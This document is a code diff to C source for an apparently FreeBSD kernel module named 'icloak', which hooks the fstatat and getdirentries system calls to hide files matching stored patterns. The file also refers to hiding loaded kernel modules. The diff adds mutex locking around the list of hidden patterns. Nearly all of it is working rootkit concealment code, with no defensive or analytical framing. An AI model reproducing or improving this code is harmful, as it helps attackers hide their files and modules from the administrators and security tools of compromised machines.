@@ -11,6 +11,8 @@
 #include <utils/memory.h>
 #include <kook.h>
 #include <sys/dirent.h>
+#include <sys/mutex.h>
+#include <sys/lock.h>
 
 static struct linker_file *find_kld(const char *name);
 
@@ -25,6 +27,27 @@ int (*fstatat_syscall)(struct thread *td, struct fstatat_args *uap) = NULL;
 int (*getdirentries_syscall)(struct thread *td, struct getdirentries_args *uap) = NULL;
 
 static icloak_filename_pattern_ctx *g_icloak_hidden_patterns = NULL, *g_icloak_hidden_patterns_tail = NULL;
+
+struct mtx g_icloak_hidden_patterns_mtx;
+
+static int g_icloak_mtx_init = 0;
+
+#define init_hidden_patterns_mutex {\
+    if (!g_icloak_mtx_init) {\
+        mtx_init(&g_icloak_hidden_patterns_mtx, NULL, NULL, MTX_DEF);\
+        g_icloak_mtx_init = 1;\
+    }\
+}
+
+#define lock_hidden_patterns_mutex(stmt) {\
+    if (!mtx_trylock(&g_icloak_hidden_patterns_mtx)) {\
+        stmt;\
+    }\
+}
+
+#define unlock_hidden_patterns_mutex {\
+    mtx_unlock(&g_icloak_hidden_patterns_mtx);\
+}
 
 int native_icloak_ko(const char *name) {
     struct linker_file *kld;
@@ -133,6 +156,8 @@ int native_hide_file(const char *pattern) {
         return 1;
     }
 
+    init_hidden_patterns_mutex
+
     if (fstatat_syscall == NULL) {
         kook(SYS_fstatat, icloak_fstatat, (void **)&fstatat_syscall);
     }
@@ -141,8 +166,12 @@ int native_hide_file(const char *pattern) {
         kook(SYS_getdirentries, icloak_getdirentries, (void **)&getdirentries_syscall);
     }
 
+    lock_hidden_patterns_mutex(return 1);
+
     g_icloak_hidden_patterns = icloak_add_filename_pattern(g_icloak_hidden_patterns,
                                                            pattern, strlen(pattern), &g_icloak_hidden_patterns_tail);
+
+    unlock_hidden_patterns_mutex
 
     return 0;
 }
@@ -151,6 +180,10 @@ int native_show_file(const char *pattern) {
     if (pattern == NULL) {
         return 1;
     }
+
+    init_hidden_patterns_mutex
+
+    lock_hidden_patterns_mutex(return 1);
 
     g_icloak_hidden_patterns = icloak_del_filename_pattern(g_icloak_hidden_patterns, pattern);
 
@@ -168,7 +201,18 @@ int native_show_file(const char *pattern) {
                 getdirentries_syscall = NULL;
             }
         }
+
+        g_icloak_mtx_init = 0;
+        unlock_hidden_patterns_mutex
+
+        mtx_destroy(&g_icloak_hidden_patterns_mtx);
+
+        goto native_show_file_epilogue;
     }
+
+    unlock_hidden_patterns_mutex
+
+native_show_file_epilogue:
 
     return 0;
 }
@@ -176,7 +220,11 @@ int native_show_file(const char *pattern) {
 static int icloak_fstatat(struct thread *td, struct fstatat_args *uap) {
     int matches;
 
+    lock_hidden_patterns_mutex(return EFAULT);
+
     matches = icloak_match_filename(uap->path, g_icloak_hidden_patterns);
+
+    unlock_hidden_patterns_mutex
 
     if (matches) {
         return ENOENT;
@@ -207,6 +255,11 @@ static int icloak_getdirentries(struct thread *td, struct getdirentries_args *ua
     delta = 0;
     bp = buf;
 
+    lock_hidden_patterns_mutex({
+                                td->td_retval[0] = 0;
+                                return 0;
+                               });
+
     while (num > 0) {
         if (icloak_match_filename(dirp->d_name, g_icloak_hidden_patterns)) {
             delta += dirp->d_reclen;
@@ -226,6 +279,8 @@ static int icloak_getdirentries(struct thread *td, struct getdirentries_args *ua
     }
 
     icloak_free(buf);
+
+    unlock_hidden_patterns_mutex
 
     return 0;
 }
@@ -285,3 +340,9 @@ find_mod_epilogue:
 
     return mp;
 }
+
+#undef init_hidden_patterns_mutex
+
+#undef lock_hidden_patterns_mutex
+
+#undef unlock_hidden_patterns_mutex
